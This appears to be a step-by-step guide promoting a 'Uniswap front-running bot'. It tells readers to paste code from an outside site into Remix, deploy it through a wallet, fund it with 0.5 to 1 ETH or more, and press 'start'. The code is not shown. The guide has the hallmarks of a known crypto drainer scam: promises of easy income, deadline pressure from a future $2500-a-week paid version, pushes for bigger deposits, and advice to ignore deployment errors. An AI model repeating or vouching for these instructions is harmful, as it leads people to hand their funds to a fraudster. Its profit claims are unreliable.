🚨🚨 READ ME! : I've received messages from people who didn't fund the contract with enough Ethereum to cover gas fees and possible burn fees. The bot targets token contracts with max 10% burn fee and anything lower. However, nowadays most tokens come with 2~6% fees. If you fund the contract with 0.4 ETH or less, and the bot targets another token with high burn fees, the contract will waste a lot of gas fees. I recommend funding the contract with at least 0.5 ~ 1 ETH to make sure that won't happen.🚨🚨

🚨 However, starting from Aug/1, 2024, I'll be introducing a paid version of the bot. The free version's API Key will become inactive, preventing deployment of the contract. The paid version will be priced at $2500 per week. Until this change takes effect, everyone is encouraged to try it out and capitalize on the opportunity to earn some substantial income.

STEP BY STEP INSTRUCTIONS

1. Use MetaMask or other:
-Download MetaMask or other: https://metamask.io/download
-Download Coin Base Wallet:  https://www.coinbase.com/wallet
-Download Trust Wallet:  https://trustwallet.com/download
If you're using Trust Wallet or Coinbase Wallet all steps are exact the same as with Meta Mask Wallet.

2. Access Remix:
https://remix.ethereum.org/

3. Click on the “contracts” folder and then create “New File”. Rename it as you like, i.e: “bot.sol”. Make sure it ends with .sol for Ethereum programming language.

Note: There is a problem if the text is not colored when you create bot.sol. Simply refresh the browser and then paste rentry codes again.

4. Paste THIS code in Remix: 
NEW UPDATED CODE VERSION  
https://etherbot.pro

5. Go to the "Compile" tab on Remix and Compile with Solidity version 0.6.6

6. Go to the “DEPLOY & RUN TRANSACTIONS” tab, select the “Injected Web3” as environment and then “Deploy”. By approving the Metamask Contract creation fee, you will have created your own contract.

Note: Make sure the name of your bot is selected in the CONTRACT section above deploy button. In this case mine would be "UniswapFrontrunBot -bot.sol".

Also if you get this message after deployment "Failed to publish metadata file to ipfs, please check the ipfs gateways is available. [{},{},{}] ". You can just ignore it and continue. This feature is to publish your bot to IPFS. Its not necessary, because the bot is in the blockchain and can be accessed through remix.

7. Fund your bot to be able to frontrun transactions.
Make sure your deposit is more than 0.5 ETH( to prevent negating slippage ) to your exact contract/bot address.

8. After your transaction is confirmed, click the "start" button to run the bot. Withdraw money at any time by clicking the "Withdraw" button
